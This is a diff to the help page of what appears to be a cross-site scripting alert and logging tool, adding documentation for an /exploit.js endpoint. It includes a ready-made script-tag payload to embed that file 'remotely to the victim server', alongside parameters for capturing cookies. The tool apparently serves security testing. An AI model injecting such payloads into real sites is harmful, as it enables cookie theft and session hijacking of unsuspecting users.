@@ -20,6 +20,7 @@
 					<ul>
 						<li><b>/logger/{your_code}</b> : This is where you make normal requests to (for request logging).</li>
 						<li><b>/</b>: This is where you request to generate injection alerts. There are query string parameters such as <span class="text-stone-100">url</span>, <span class="text-stone-100">by</span>, <span class="text-stone-100">code</span>, <span class="text-stone-100">plaintext</span>, <span class="text-stone-100">cookie</span>, and <span class="text-stone-100">b64</span>.</li>
+						<li><b>/exploit.js</b>: This is where the exploit.js file lies, you can link this js file remotely to the victim server with the script tag.</li>
 					</ul>
 				</div>
 				<div class="flex space-x-5 flex-col text-lg">
@@ -64,6 +65,15 @@
 						<li>2.) Craft the URL to the logger endpoint <b>http://localhost:4000/logger/{your_code}/{custom_message}</b></li>
 						<br>
 						<li>Example: <b>http://localhost:4000/logger/123456/anythingblahblah</b></li>
+					</ul>
+				</div>
+				<div class="flex space-x-5 flex-col text-lg">
+					<h3 class="text-lg font-bold">How to link to the exploit.js script:</h3>
+					<ul>
+						<li>1.) Craft the URL to the JS file <b>http://localhost:4000/exploit.js</b></li>
+						<li>2.) Embed in the script tag <b>&lt;script src="http://localhost:4000/exploit.js"&gt;&lt;/script&gt;</b></li>
+						<br>
+						
 					</ul>
 				</div>
 			</div>
